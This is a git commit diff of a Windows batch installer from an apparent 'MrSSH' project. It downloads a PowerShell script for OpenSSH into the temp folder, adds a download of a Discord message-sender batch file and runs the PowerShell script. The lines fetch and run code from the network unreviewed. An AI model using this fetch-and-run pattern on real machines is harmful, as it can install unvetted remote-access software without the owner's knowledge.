cf432367047368fcf78365a680624051b8b9c98c
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-12 18:18:09 +0200

    Update Installer.bat

--- SSH FIles/Installer.bat
+++ SSH FIles/Installer.bat
@@ -1,7 +1,7 @@
 C:
 cd %temp%
 
-curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH.ps1 -O ssh.ps1
-
+curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -O ssh.ps1
+curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -O discordmsg.bat
 
 powershell ./ssh.ps1
